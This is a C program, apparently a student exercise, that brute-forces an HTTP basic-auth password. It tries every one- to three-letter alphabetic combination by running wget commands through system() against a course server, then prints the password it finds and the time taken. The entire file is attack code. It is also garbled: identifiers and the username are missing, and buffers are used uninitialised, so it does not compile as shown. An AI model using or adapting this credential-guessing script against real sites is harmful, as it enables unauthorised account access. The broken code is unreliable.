#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<ctype.h>
#include<time.h>

int ()
{

 int m,n,o,i;
 char URL[255];
 char v[3];
 char temp1[100];
char temp2[100];
char temp3[250];
char [53]={'a','A','b','B','c','C','d','D','e','E','f','F','g','G','h','H','i','I','j','J','k','K','l','L','m','M','n','N','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z'};
time_t u1,u2;

  (void) time(&u1); 
 strcpy(temp1,"wget --http-user= --http-passwd=");
 strcpy(temp2," http://sec-crack.cs.rmit.edu./SEC/2/index.php");
 
 for(m=0;m<=51;m++)
 {
   v[0]=[m]; 
   v[1]='\0';
   v[2]='\0';
   strcpy(URL,v); 
   printf("\nTesting with password %s\n",URL);
   strcat(temp3,temp1);
   strcat(temp3,URL);
   strcat(temp3,temp2);
   printf("\nSending the  %s\n",temp3);
   i=system(temp3); 
   	
	if(i==0)
   	{
	 (void) time(&u2); 
	 printf("\n The password is %s\n",URL);
	 printf("\n\nThe time_var taken  crack the password is  %d  second\n\n",(int)(u2-u1));
     	 exit(0);
   	} 
	else
	{
	strcpy(temp3,"");
	}
  for(n=0;n<=51;n++)
  {
   v[0]=[m]; 
   v[1]=[n];
   v[2]='\0';
   strcpy(URL,v); 
   printf("\nTesting with password %s\n",URL);
   strcat(temp3,temp1);
   strcat(temp3,URL);
   strcat(temp3,temp2);
   printf("\nSending the  %s\n",temp3);
   i=system(temp3);
   	
	if(i==0)
   	{
	 (void) time(&u2); 
	 printf("\n The password is %s\n",URL);
	 printf("\n\nThe time_var taken  crack the password is  %d  second\n\n",(int)(u2-u1));
     	 exit(0);
   	} 
	else
	{
	strcpy(temp3,"");
	}
   for(o=0;o<=51;o++)
   { 
   v[0]=[m]; 
   v[1]=[n];
   v[2]=[o];
   strcpy(URL,v); 
   printf("\nTesting with password %s\n",URL);
   strcat(temp3,temp1);
   strcat(temp3,URL);
   strcat(temp3,temp2);
   printf("\nSending the  %s\n",temp3);
   i=system(temp3);
   	
	if(i==0)
   	{
	 (void) time(&u2); 
	 printf("\n The password is %s\n",URL);
	 printf("\n\nThe time_var taken  crack the password is  %d  second\n\n",(int)(u2-u1));
     	 exit(0);
   	} 
	else
	{
	strcpy(temp3,"");
	}
   
   
   }
  }
 }  
  
}  
